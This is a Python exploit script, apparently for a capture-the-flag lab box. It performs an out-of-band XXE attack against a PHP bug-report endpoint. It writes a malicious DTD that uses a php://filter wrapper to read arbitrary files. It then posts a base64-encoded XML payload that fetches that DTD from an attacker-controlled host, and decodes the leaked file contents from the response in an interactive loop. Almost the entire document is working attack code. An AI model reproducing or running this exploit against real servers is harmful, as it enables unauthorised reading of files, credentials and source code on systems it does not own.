#! /usr/bin/python3

import requests
import re
import base64

dtd = """<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={}">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">"""

regex = r"If DB were ready, would have added:\s*<table>\s*<tr>\s*<td>Title:</td>\s*<td>title</td>\s*</tr>\s*<tr>\s*<td>CWE:</td>\s*<td>cwe</td>\s*</tr>\s*<tr>\s*<td>Score:</td>\s*<td>cvss</td>\s*</tr>\s*<tr>\s*<td>Reward:</td>\s*<td>(.*)</td>\s*</tr>\s*</table>"
data = """data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwogIDwhRU5USVRZICUgZHRkIFNZU1RFTQogICJodHRwOi8vMTAuMTAuMTQuMTAyOjEyMzQvYXR0YWNrZXIuZHRkIj4KICAlZHRkOwogICVhbGw7Cl0%2BCiAgICAgICAgPGJ1Z3JlcG9ydD4KICAgICAgICA8dGl0bGU%2BdGl0bGU8L3RpdGxlPgogICAgICAgIDxjd2U%2BY3dlPC9jd2U%2BCiAgICAgICAgPGN2c3M%2BY3ZzczwvY3Zzcz4KICAgICAgICA8cmV3YXJkPiZmaWxlQ29udGVudHM7PC9yZXdhcmQ%2BCiAgICAgICAgPC9idWdyZXBvcnQ%2B"""

headers = {
    'Host': '10.129.95.166',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '377',
    'Origin': 'http://10.129.95.166',
    'DNT': '1',
    'Connection': 'close',
    'Referer': 'http://10.129.95.166/log_submit.php',
    'Sec-GPC': '1',
}

while True:
    path = input("$ ")

    with open("attacker.dtd", "w") as o:
        dtd_data = dtd.format(path)
        o.write(dtd_data)

    response = requests.post('http://10.129.95.166/tracker_diRbPr00f314.php', headers=headers, data=data, verify=False)

    matches = re.findall(regex, response.text, re.MULTILINE | re.DOTALL)
    if matches and matches[0]:
        print(base64.b64decode(matches[0]).decode())
    else:
        print("File does not exist or you do not have permission to view it.")